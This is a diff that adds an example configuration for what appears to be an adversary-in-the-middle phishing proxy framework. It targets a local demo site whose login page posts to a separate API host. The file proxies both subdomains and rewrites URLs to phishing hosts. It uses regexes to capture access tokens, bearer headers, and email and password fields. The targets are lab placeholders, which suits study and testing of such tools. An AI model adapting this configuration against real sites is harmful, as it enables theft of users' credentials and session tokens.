@@ -1,0 +1,61 @@
+name: multi-host
+author: demo
+version: "1"
+
+# Attacks the target-site example using two proxy hosts (examples/target-site/).
+# The login page is served by login.target.local, but the JS submits credentials
+# cross-origin to api.target.local/auth. Both subdomains must be proxied for the
+# attack to work. Demonstrates: multiple proxy_hosts, auto_filter, cross-origin
+# cookie sharing, auth_tokens type: body and type: header, credentials type: json.
+
+proxy_hosts:
+  - phish_sub: login
+    orig_sub:  login
+    domain:    target.local
+    is_landing: true
+    upstream_scheme: http
+
+  - phish_sub: api
+    orig_sub:  api
+    domain:    target.local
+    upstream_scheme: http
+
+# auto_filter is true by default on both hosts — it rewrites:
+#   login.target.local → login.phish.local
+#   api.target.local   → api.phish.local
+# This handles the cross-origin fetch URL in the login page's JS.
+# Explicit sub_filters are only needed for scheme correction (http → https).
+sub_filters:
+  - hostname: login.target.local
+    mime_types: [text/html, text/javascript, application/javascript]
+    search:     'http://(login|api)\.target\.local'
+    replace:    'https://$1.{domain}'
+
+auth_tokens:
+  - type:   body
+    domain: api.target.local
+    keys:
+      - name:     access_token
+        search:   '"access_token"\s*:\s*"([^"]+)"'
+        required: true
+
+  - type:   header
+    domain: api.target.local
+    keys:
+      - name:     "^X-Auth-Token$"
+        search:   "Bearer (.+)"
+        required: false
+
+credentials:
+  username:
+    key:    "email"
+    search: '"email"\s*:\s*"([^"]+)"'
+    type:   json
+  password:
+    key:    "password"
+    search: '"password"\s*:\s*"([^"]+)"'
+    type:   json
+
+login:
+  domain: api.target.local
+  path:   /auth
